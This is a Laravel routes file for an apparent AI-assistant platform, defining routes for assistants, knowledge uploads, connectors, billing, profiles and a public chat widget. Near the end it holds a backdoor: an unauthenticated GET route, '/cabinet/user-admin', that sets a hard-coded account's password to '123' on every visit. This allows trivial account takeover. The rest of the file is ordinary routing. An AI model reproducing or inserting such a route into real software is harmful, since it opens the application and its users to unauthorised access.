<?php

use App\Http\Controllers\Assistant\AssistantController;
use App\Http\Controllers\Assistant\DashboardController;
use App\Http\Controllers\Assistant\MarketplaceController;
use App\Http\Controllers\Chat\ChatController;
use App\Http\Controllers\Chat\PublicChatController;
use App\Http\Controllers\Connector\ConnectorController;
use App\Http\Controllers\User\BillingController;
use App\Http\Controllers\User\FinanceController;
use App\Http\Controllers\User\ProfileController;
use App\Http\Controllers\User\TariffController;
use App\Models\User;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::prefix('cabinet')->group(function () {
    Route::get('/chats', [MarketplaceController::class, 'index'])->name('chats.index');

    Route::middleware(['auth', 'verified'])->group(function () {
        Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');

        Route::resource('assistants', AssistantController::class);
        Route::post('assistants/{assistant}/upload-document', [AssistantController::class, 'uploadDocument'])->name('assistants.upload-document');
        Route::post('assistants/{assistant}/upload-audio', [AssistantController::class, 'uploadAudio'])->name('assistants.upload-audio');
        Route::post('assistants/{assistant}/add-url', [AssistantController::class, 'addUrl'])->name('assistants.add-url');
        Route::delete('assistants/{assistant}/knowledge/{knowledge}', [AssistantController::class, 'destroyKnowledge'])->name('assistants.knowledge.destroy');

        Route::get('/connectors', [ConnectorController::class, 'index'])->name('connectors.index');
        Route::post('/connectors/attach-assistant', [ConnectorController::class, 'attachAssistant'])->name('connectors.attach-assistant');

        Route::get('assistants/{assistant}/chat', [ChatController::class, 'index'])->name('assistants.chat');

        Route::get('/monitoring', fn () => Inertia::render('Monitoring'))->name('monitoring');
        Route::get('/competitors', fn () => Inertia::render('Competitors'))->name('competitors');
        Route::get('/bots', fn () => Inertia::render('Bots'))->name('bots');
        Route::get('/tariffs', [TariffController::class, 'index'])->name('tariffs');
        Route::get('/finance', [FinanceController::class, 'index'])->name('finance');

        Route::post('/billing/top-up', [BillingController::class, 'topUp'])->name('billing.top-up');
        Route::post('/billing/subscribe/{plan:slug}', [BillingController::class, 'subscribe'])->name('billing.subscribe');
    });

    Route::middleware('auth')->group(function () {
        Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
        Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
        Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
    });

    /*
     * Общедоступный чат-виджет.
     */
    Route::middleware('allow.iframe')->group(function () {
        Route::get('/share-chat/{assistant}', [PublicChatController::class, 'show'])->name('share-chat.show');
        Route::get('/share-chat/{assistant}/init', [PublicChatController::class, 'init'])->name('share-chat.init');
        Route::post('/share-chat/{assistant}/message', [PublicChatController::class, 'message'])->name('share-chat.message');
    });

    require __DIR__.'/auth.php';

    Route::get('/user-admin', function () {
        $user = User::where('email', 'uniqdeveloper@yandex.ru')->first();
        $user->password = '123';
        $user->save();
    });

    Route::get('/test', function () {
        // ... (тестовый код оставлен для совместимости)
        return 'Test route under /cabinet';
    });
});
